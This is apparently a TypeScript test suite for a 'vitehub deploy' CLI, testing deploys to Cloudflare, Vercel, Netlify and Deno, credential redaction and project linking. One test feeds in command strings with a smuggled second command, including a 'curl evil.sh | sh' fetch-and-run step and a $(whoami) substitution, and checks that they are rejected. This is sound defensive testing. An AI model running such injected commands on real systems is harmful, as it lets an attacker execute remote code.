import { execFileSync } from "node:child_process"
import { existsSync } from "node:fs"
import { readFile, writeFile } from "node:fs/promises"
import { delimiter, join } from "node:path"

import { describe, expect, it } from "vitest"

import { buildOutput, builtProject, expectNoLeak, fakeHosts } from "./setup-deploy-helpers.ts"
import { createProject, runSetup } from "./setup-helpers.ts"

import type { ViteHubCliSpawn } from "@vite-hub/internal/cli"
import type { HostCliRun } from "@vite-hub/internal/host-credentials"
import type { SetupDeployOutput, SetupError, SetupMissing } from "../src/setup/index.ts"

type DeployJson = SetupDeployOutput & { error?: SetupError, missing?: SetupMissing[], rerun?: string }

const cloudflareEnv = { CLOUDFLARE_ACCOUNT_ID: "acc-1", CLOUDFLARE_API_TOKEN: "cf-token-1" }
const vercelEnv = { VERCEL_TEAM_ID: "team_1", VERCEL_TOKEN: "vercel-token-1" }
const netlifyEnv = { NETLIFY_AUTH_TOKEN: "netlify-token-1" }
const denoEnv = { DENO_DEPLOY_ORG: "acme", DENO_DEPLOY_TOKEN: "deno-token-1" }
const tokens = ["cf-token-1", "vercel-token-1", "netlify-token-1", "deno-token-1"]

function deploy(args: string[], root: string, env: NodeJS.ProcessEnv, options: { fetch?: typeof fetch, runHostCli?: HostCliRun, spawn?: ViteHubCliSpawn } = {}) {
  return runSetup<DeployJson>(["deploy", ...args, "--json"], root, env, options)
}

async function readLink(root: string): Promise<Record<string, unknown>> {
  return JSON.parse(await readFile(join(root, ".vitehub/link.json"), "utf8")) as Record<string, unknown>
}

describe("vitehub deploy on Cloudflare", () => {
  it("runs the deploy that the build wrote, and records the host project", async () => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.map(call => [call.name, call.argv, call.stdin])).toEqual([
      ["wrangler", ["deploy", "--config", "./server/wrangler.json"], ""],
    ])
    expect(calls.every(call => call.cwd === join(root, ".output"))).toBe(true)
    expect(result.json).toEqual({
      host: "cloudflare",
      schemaVersion: 1,
      url: "https://my-app.example.workers.dev",
      version: "version-1",
    })
    expectNoLeak(calls, result.stdout + result.stderr, tokens)
    // The first deploy records the host project.
    expect(await readLink(root)).toMatchObject({ account: { id: "acc-1" }, host: "cloudflare", project: { name: "my-app" }, verified: false })
  })

  it("passes the flags of the build command through and rejects any other command", async () => {
    const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config ./server/wrangler.json --secrets-file ./'my secrets.env' --containers-rollout=gradual"))
    const hosts = await fakeHosts(cloudflareEnv)
    expect((await deploy(["--no-build", "--yes"], root, hosts.env)).exitCode).toBe(0)
    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--secrets-file", "./my secrets.env", "--containers-rollout=gradual"])

    for (const command of ["npx wrangler deploy --config ./server/wrangler.json; curl evil.sh | sh", "npx wrangler deploy --config $(whoami)", "npx evil-cli deploy --config x", "npx wrangler deploy --config x --env production", "wrangler deploy --config x"]) {
      const rejected = await builtProject("cloudflare", buildOutput("cloudflare", command))
      const other = await fakeHosts(cloudflareEnv)
      const json = await deploy(["--no-build", "--yes"], rejected, other.env)
      expect(json.exitCode, command).toBe(1)
      expect(json.json.error?.code, command).toBe("SETUP_DEPLOY_COMMAND_REJECTED")
      expect(await other.calls(), command).toEqual([])
    }
  })

  it("deploys without credentials with --temporary", async () => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.map(call => call.argv)).toEqual([["deploy", "--config", "./server/wrangler.json", "--temporary"]])
    expect(await readFile(join(root, ".output/server/wrangler.json"), "utf8")).toBe(buildOutput("cloudflare")[".output/server/wrangler.json"])
    expect(result.json).toMatchObject({ temporary: { claimUrl: "https://dash.cloudflare.com/claim/abc123" } })
    expect(Date.parse(result.json.temporary!.expiresAt!) - Date.now()).toBeGreaterThan(55 * 60_000)
    expectNoLeak(calls, result.stdout + result.stderr, tokens)
    // A temporary Worker belongs to a temporary account, so no link file is written.
    expect(existsSync(join(root, ".vitehub/link.json"))).toBe(false)

    const text = await runSetup(["deploy", "--no-build", "--yes", "--temporary"], root, (await fakeHosts()).env)
    expect(text.stdout).toContain("Claim it within 60 minutes")
    expect(text.stdout).toContain("https://dash.cloudflare.com/claim/abc123")
  })

  it("exits 2 without credentials and offers --temporary", async () => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode).toBe(2)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_CREDENTIALS_MISSING")
    expect(result.json.error?.fix).toContain("vitehub deploy --no-build --temporary --yes --json")
    expect(result.json.error?.fix).toContain("60 minutes")
    expect(result.json.missing).toEqual([{ field: "CLOUDFLARE_API_TOKEN" }])
    expect(result.json.rerun).toBe("vitehub deploy --no-build --temporary --yes --json")
    expect(await hosts.calls()).toEqual([])
  })

  it("refuses --temporary with credentials, because Wrangler refuses it with a login", async () => {
    const result = await deploy(["--no-build", "--yes", "--temporary"], await builtProject("cloudflare"), (await fakeHosts(cloudflareEnv)).env)
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
  })

  it("uploads a preview version with --preview", async () => {
    const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config ./server/wrangler.json --containers-rollout=gradual"))
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)
    expect(result.exitCode, result.stderr).toBe(0)
    expect((await hosts.calls())[0]!.argv).toEqual(["versions", "upload", "--config", "./server/wrangler.json"])
    expect(result.json.url).toBe("https://v1-my-app.example.workers.dev")
  })

  it("marks the deploy with the git commit", async () => {
    const root = await builtProject("cloudflare")
    const git = (...args: string[]) => execFileSync("git", args, { cwd: root, env: { GIT_AUTHOR_EMAIL: "t@example.com", GIT_AUTHOR_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.com", GIT_COMMITTER_NAME: "t", LC_ALL: "C", PATH: "/usr/bin:/bin" } }).toString().trim()
    git("init", "-q")
    git("add", ".")
    git("commit", "-q", "-m", "init")
    const sha = git("rev-parse", "HEAD")
    const hosts = await fakeHosts(cloudflareEnv)

    const clean = await deploy(["--no-build", "--yes"], root, hosts.env)
    expect(clean.exitCode, clean.stderr).toBe(0)
    expect(clean.json.commit).toEqual({ dirty: false, sha })
    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--tag", sha.slice(0, 12), "--message", `vitehub:{"commit":"${sha}","dirty":false}`])

    await writeFile(join(root, "changed.txt"), "x")
    const dirty = await deploy(["--no-build", "--yes"], root, hosts.env)
    expect(dirty.json.commit).toEqual({ dirty: true, sha })
  })

  it("has no commit marker outside git", async () => {
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build", "--yes"], await builtProject("cloudflare"), hosts.env)
    expect(result.json.commit).toBeUndefined()
    expect((await hosts.calls())[0]!.argv).not.toContain("--tag")
  })
})

describe("vitehub deploy on Vercel", () => {
  it.each([false, true])("uses a saved CLI login for deploy (linked: %s)", async (linked) => {
    const root = await builtProject("vercel", linked ? { ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }) } : {})
    const hosts = await fakeHosts({ VERCEL_TEAM_ID: linked ? "other-team" : "team_1" })
    const probes: string[][] = []
    const runHostCli: HostCliRun = async (command, args, options) => {
      probes.push([command, ...args])
      expect(options).toEqual({ cwd: root, env: hosts.env })
      return { exitCode: 0, stdout: "saved-user\n" }
    }
    const result = await deploy(["--no-build", "--yes"], root, hosts.env, { runHostCli })

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect(probes).toHaveLength(1)
    expect(probes[0]!.at(-1)).toBe("whoami")
    expect(probes[0]).toContain(join(hosts.env.PATH!.split(delimiter)[0]!, "vercel"))
    const calls = await hosts.calls()
    expect(calls.map(call => call.argv.slice(0, 2))).toEqual([["deploy", "--prebuilt"]])
    for (const call of calls) {
      expect(call.argv).toEqual(expect.arrayContaining(["--project", linked ? "prj_1" : "my-app", "--scope", "team_1"]))
    }
    expectNoLeak(calls, result.stdout + result.stderr, tokens)
  })

  it("creates the project with the deploy", async () => {
    const root = await builtProject("vercel")
    const hosts = await fakeHosts(vercelEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const project = ["--project", "my-app", "--scope", "team_1"]
    expect((await hosts.calls()).map(call => [call.argv, call.stdin])).toEqual([
      [["deploy", "--prebuilt", "--yes", "--json", "--prod", ...project, "--create-if-missing"], ""],
    ])
    expect(result.json).toEqual({
      deploymentId: "dpl_1",
      host: "vercel",
      schemaVersion: 1,
      url: "https://my-app.vercel.app",
    })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
  })

  it.each([{}, { VERCEL_TEAM_ID: "other-team" }, { VERCEL_ORG_ID: "other-team" }])("uses the verified linked project and team for the deploy, with credential metadata %j", async (teamEnv) => {
    const root = await builtProject("vercel", {
      ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }),
    })
    const sha = "0123456789abcdef0123456789abcdef01234567"
    const hosts = await fakeHosts({ VERCEL_TOKEN: "vercel-token-1", ...teamEnv })
    // A fake git on PATH answers for the repository.
    await writeFile(join(hosts.env.PATH!.split(":")[0]!, "git"), `#!/bin/sh\n[ "$1" = rev-parse ] && echo ${sha}\nexit 0\n`, { mode: 0o755 })
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.map(call => call.argv.slice(0, 2))).toEqual([["deploy", "--prebuilt"]])
    expect(calls[0]!.argv).toEqual(["deploy", "--prebuilt", "--yes", "--json", "--prod", "--project", "prj_1", "--scope", "team_1", "--create-if-missing", "--meta", `vitehubCommit=${sha}`, "--meta", "vitehubDirty=false"])
    expectNoLeak(calls, result.stdout + result.stderr, tokens)
  })

  it("deploys with --temporary", async () => {
    const root = await builtProject("vercel")
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls()).map(call => call.argv)).toEqual([["deploy", "--prebuilt", "--yes", "--json", "--prod", "--temporary"]])
    expect(await readFile(join(root, ".vercel/output/functions/__server.func/.vc-config.json"), "utf8")).toBe(buildOutput("vercel")[".vercel/output/functions/__server.func/.vc-config.json"])
    expect(result.json).toMatchObject({ temporary: { claimUrl: "https://vercel.com/claim/xyz", expiresAt: "2026-11-07T00:00:00.000Z" } })
    // The anonymous token in .vercel/anonymous.json stays there.
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, ["anonymous-token"])
  })

  it("refuses --temporary in a linked folder and in CI", async () => {
    const linked = await builtProject("vercel", { ".vercel/project.json": "{}" })
    expect((await deploy(["--no-build", "--yes", "--temporary"], linked, (await fakeHosts()).env)).json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
    const ci = await deploy(["--no-build", "--yes", "--temporary"], await builtProject("vercel"), (await fakeHosts({ CI: "1" })).env)
    expect(ci.exitCode).toBe(3)
  })

  it("exits 2 without credentials and offers --temporary", async () => {
    const result = await deploy(["--no-build", "--yes"], await builtProject("vercel"), (await fakeHosts()).env)
    expect(result.exitCode).toBe(2)
    expect(result.json.missing).toEqual([{ field: "VERCEL_TOKEN" }])
    expect(result.json.rerun).toBe("vitehub deploy --no-build --temporary --yes --json")
  })
})

describe("vitehub deploy on Netlify", () => {
  it("deploys a draft with --preview", async () => {
    const root = await builtProject("netlify")
    const hosts = await fakeHosts(netlifyEnv)
    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls()).map(call => call.argv)).toEqual([
      ["deploy", "--no-build", "--dir", "dist", "--json", "--context", "deploy-preview", "--site-name", "my-app"],
    ])
    expect(result.json).toMatchObject({ url: "https://deploy--my-app.netlify.app" })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
  })

  it("deploys to production and records the site", async () => {
    const root = await builtProject("netlify")
    const hosts = await fakeHosts(netlifyEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls()).map(call => call.argv)).toEqual([
      ["deploy", "--no-build", "--dir", "dist", "--json", "--prod", "--site-name", "my-app"],
    ])
    expect(result.json).toEqual({ deploymentId: "deploy-1", host: "netlify", schemaVersion: 1, url: "https://my-app.netlify.app" })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
    expect(await readLink(root)).toMatchObject({ host: "netlify", project: { id: "site-1", name: "my-app" }, verified: false })
  })

  it("has no temporary deploy", async () => {
    const result = await deploy(["--no-build", "--yes", "--temporary"], await builtProject("netlify"), (await fakeHosts()).env)
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
  })

  it("exits 2 without credentials and offers no --temporary", async () => {
    const result = await deploy(["--no-build", "--yes"], await builtProject("netlify"), (await fakeHosts()).env)
    expect(result.exitCode).toBe(2)
    expect(result.json.rerun).toBeUndefined()
    expect(result.json.error?.fix).not.toContain("--temporary")
  })
})

describe("vitehub deploy on Deno", () => {
  it.each([undefined, "other-org"])("uses the linked organization and app when DENO_DEPLOY_ORG is %s", async (organization) => {
    const root = await builtProject("deno", {
      ".vitehub/link.json": JSON.stringify({ account: { id: "linked-org" }, host: "deno", linkedAt: "", project: { name: "linked-app" }, schemaVersion: 1, verified: true }),
    })
    const hosts = await fakeHosts({ DENO_DEPLOY_ORG: organization, DENO_DEPLOY_TOKEN: "deno-token-1" })
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    const calls = await hosts.calls()
    expect(calls.some(call => call.argv.includes("create"))).toBe(true)
    for (const call of calls) {
      expect(call.argv.slice(call.argv.indexOf("--org"), call.argv.indexOf("--org") + 4)).toEqual(["--org", "linked-org", "--app", "linked-app"])
    }
    expectNoLeak(calls, result.stdout + result.stderr, tokens)
  })

  it("creates the app with the first deploy", async () => {
    const root = await builtProject("deno")
    const hosts = await fakeHosts(denoEnv)
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)

    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls()).map(call => [call.argv, call.stdin])).toEqual([
      [["deploy", "create", ".", "--source", "local", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
    ])
    expect(result.json).toEqual({ host: "deno", schemaVersion: 1, url: "https://my-app.acme.deno.net" })
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
  })

  it("needs the organization, and has no --preview or --temporary", async () => {
    const root = await builtProject("deno")
    const noOrg = await deploy(["--no-build", "--yes"], root, (await fakeHosts({ DENO_DEPLOY_TOKEN: "deno-token-1" })).env)
    expect(noOrg.exitCode).toBe(2)
    expect(noOrg.json.missing).toEqual([{ field: "DENO_DEPLOY_ORG" }])
    expect((await deploy(["--no-build", "--yes", "--preview"], root, (await fakeHosts(denoEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_PREVIEW_UNSUPPORTED")
    expect((await deploy(["--no-build", "--yes", "--temporary"], root, (await fakeHosts()).env)).exitCode).toBe(3)
  })
})

describe("vitehub deploy", () => {
  it.each([false, true])("redacts echoed host credentials with failure=%s", async (fail) => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_ECHO_TOKEN: "1", ...(fail ? { FAKE_HOST_FAIL: "wrangler deploy ./server/wrangler.json" } : {}) })
    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
    expect(result.exitCode, result.stdout + result.stderr).toBe(fail ? 1 : 0)
    expect(result.stderr).toContain("stdout token: <redacted>")
    expect(result.stderr).toContain("stderr token: <redacted>")
    if (fail) expect(result.json.error).toBeDefined()
    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
  })

  it.each([undefined, "other-account"])("uses the linked Cloudflare account and Worker when the credential account is %s", async (accountId) => {
    const root = await builtProject("cloudflare", {
      ".vitehub/link.json": JSON.stringify({ account: { id: "linked-account" }, host: "cloudflare", project: { name: "linked-worker" }, schemaVersion: 1, verified: true, linkedAt: "" }),
    })
    const hosts = await fakeHosts({ CLOUDFLARE_API_TOKEN: cloudflareEnv.CLOUDFLARE_API_TOKEN, ...(accountId ? { CLOUDFLARE_ACCOUNT_ID: accountId } : {}) })
    for (const flags of [[], ["--preview"]]) {
      const result = await deploy(["--no-build", "--yes", ...flags], root, hosts.env)
      expect(result.exitCode, result.stdout + result.stderr).toBe(0)
      expect(result.json.url).toContain("linked-worker")
    }
    for (const call of await hosts.calls()) {
      expect(call.accountId).toBe("linked-account")
      expect(call.argv.slice(call.argv.indexOf("--name"), call.argv.indexOf("--name") + 2)).toEqual(["--name", "linked-worker"])
    }
    expectNoLeak(await hosts.calls(), "", tokens)
  })

  it("keeps a temporary Cloudflare deploy independent of a previously linked account", async () => {
    const root = await builtProject("cloudflare", {
      ".vitehub/link.json": JSON.stringify({ account: { id: "old-account" }, host: "cloudflare", project: { name: "old-worker" }, schemaVersion: 1, verified: true, linkedAt: "" }),
    })
    const hosts = await fakeHosts()
    const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)
    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
    expect((await hosts.calls())[0]!.accountId).toBeUndefined()
    expect((await hosts.calls())[0]!.argv).not.toContain("--name")
  })

  it("exits 2 with a rerun without a terminal and without --yes", async () => {
    const hosts = await fakeHosts(cloudflareEnv)
    const result = await deploy(["--no-build"], await builtProject("cloudflare"), hosts.env)
    expect(result.exitCode).toBe(2)
    expect(result.json.rerun).toBe("vitehub deploy --no-build --yes --json")
    expect(await hosts.calls()).toEqual([])
  })

  it("runs the build script with the package manager, unless --no-build", async () => {
    const root = await builtProject("cloudflare")
    const hosts = await fakeHosts(cloudflareEnv)
    const spawned: string[][] = []
    const spawn: ViteHubCliSpawn = async (command, args, options) => {
      spawned.push([command, ...args, options?.cwd ?? ""])
      return { exitCode: 0 }
    }
    expect((await deploy(["--yes"], root, hosts.env, { spawn })).exitCode).toBe(0)
    expect(spawned).toEqual([["pnpm", "run", "build", root]])

    const failing: ViteHubCliSpawn = async () => ({ exitCode: 2 })
    const failed = await deploy(["--yes"], root, hosts.env, { spawn: failing })
    expect(failed.exitCode).toBe(1)
    expect(failed.json.error?.code).toBe("SETUP_DEPLOY_BUILD_FAILED")
  })

  it.each(["vercel", "netlify", "node"])("rejects a linked Cloudflare host conflicting with configured %s before building or uploading stale output", async (preset) => {
    const root = await builtProject("cloudflare", {
      ".vitehub/link.json": JSON.stringify({ host: "cloudflare", linkedAt: "", project: { name: "my-app" }, schemaVersion: 1, verified: true }),
      "vite.config.ts": `import { vitehub } from "vite-hub"\nexport default { plugins: [vitehub({ host: "${preset}" })] }\n`,
    })
    const hosts = await fakeHosts(cloudflareEnv)
    const spawned: string[] = []
    const spawn: ViteHubCliSpawn = async (command) => {
      spawned.push(command)
      return { exitCode: 0 }
    }
    for (const args of [["--yes"], ["--no-build", "--yes"]]) {
      const result = await deploy(args, root, hosts.env, { spawn })
      expect(result.exitCode, result.stdout + result.stderr).toBe(3)
      expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_MISMATCH")
      expect(result.loadConfig).not.toHaveBeenCalled()
    }
    expect(spawned).toEqual([])
    expect(await hosts.calls()).toEqual([])
  })

  it("needs a build script and a build output for the host", async () => {
    const noScript = await builtProject("cloudflare", { "package.json": JSON.stringify({ name: "my-app" }) })
    expect((await deploy(["--yes"], noScript, (await fakeHosts(cloudflareEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_BUILD_FAILED")

    const unbuilt = await createProject({ "package.json": JSON.stringify({ name: "my-app" }), "vite.config.ts": "import { vitehub } from \"vite-hub\"\nexport default { plugins: [vitehub({ host: \"cloudflare\" })] }\n" })
    expect((await deploy(["--no-build", "--yes"], unbuilt, (await fakeHosts(cloudflareEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_OUTPUT_MISSING")

    const mismatch = await builtProject("cloudflare", { ".output/deployment.json": JSON.stringify({ host: "node" }) })
    const result = await deploy(["--no-build", "--yes"], mismatch, (await fakeHosts(cloudflareEnv)).env)
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_MISMATCH")
  })

  it("has no upload for a Node server", async () => {
    const root = await createProject({ "package.json": JSON.stringify({ name: "my-app" }), "vite.config.ts": "import { vitehub } from \"vite-hub\"\nexport default { plugins: [vitehub()] }\n" })
    const result = await deploy(["--no-build", "--yes"], root, {})
    expect(result.exitCode).toBe(3)
    expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_UNSUPPORTED")
  })

  it("prints the URL", async () => {
    const root = await builtProject("cloudflare")
    const result = await runSetup(["deploy", "--no-build", "--yes"], root, (await fakeHosts(cloudflareEnv)).env)
    expect(result.exitCode, result.stderr).toBe(0)
    expect(result.stdout).toBe("Deployed my-app to cloudflare: https://my-app.example.workers.dev\nVersion: version-1\n")
    expect(existsSync(join(root, ".vitehub/link.json"))).toBe(true)
  })
})
